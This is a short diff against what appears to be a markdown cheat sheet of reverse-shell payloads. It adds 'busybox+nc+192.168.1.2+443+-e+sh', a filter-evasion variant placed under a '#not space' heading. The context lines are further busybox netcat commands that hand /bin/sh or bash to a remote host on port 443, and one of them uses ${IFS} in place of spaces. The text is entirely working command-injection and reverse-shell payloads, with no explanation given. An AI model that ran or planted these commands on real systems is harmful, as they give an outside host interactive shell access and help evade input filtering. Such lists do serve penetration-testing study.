@@ -183,6 +183,7 @@ busybox nc 192.168.1.2 443 -e /bin/sh
 busybox nc 192.168.1.2 443 -e bash
 busybox nc 192.168.1.2 443 -e /bin/bash
 #not space
+busybox+nc+192.168.1.2+443+-e+sh
 busybox${IFS}nc${IFS}192.168.1.2${IFS}443${IFS}-e${IFS}sh
 ```
 
